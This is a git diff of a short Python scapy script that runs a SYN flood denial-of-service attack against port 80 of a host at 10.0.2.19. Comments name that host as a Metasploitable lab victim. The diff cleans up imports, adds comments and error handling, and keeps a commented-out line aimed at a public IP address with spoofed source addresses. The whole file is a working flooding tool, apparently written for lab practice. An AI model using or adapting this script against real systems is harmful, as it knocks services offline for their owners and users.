@@ -1,12 +1,14 @@
 #!/usr/bin/python3
-from sys import stdout
 from scapy.all import *
-from random import randint
-from argparse import ArgumentParser
 
+# The following is a SYN Flood attack on http port of metasploitable
 
+metasploitable_IP="10.0.2.19"  # taget IP address, victim of SYN flood
+target_port=80  # attacking the http port
 
-# packet=IP(dst="37.202.5.70",src=RandIP("192.168.1.246/24")) / TCP(dport=80,sport=RandShort(),flags="S")
-
-packet=IP(dst="10.0.2.19") / TCP(dport=80,sport=RandShort(),flags="S")
-srloop(packet)
+try:
+    # packet=IP(dst="37.202.5.70",src=RandIP("192.168.1.246/24")) / TCP(dport=80,sport=RandShort(),flags="S")
+    packet=IP(dst=metasploitable_IP) / TCP(dport=target_port,sport=RandShort(),flags="S")
+    srloop(packet,iface='lo')
+except Exception as e:
+    print(e)
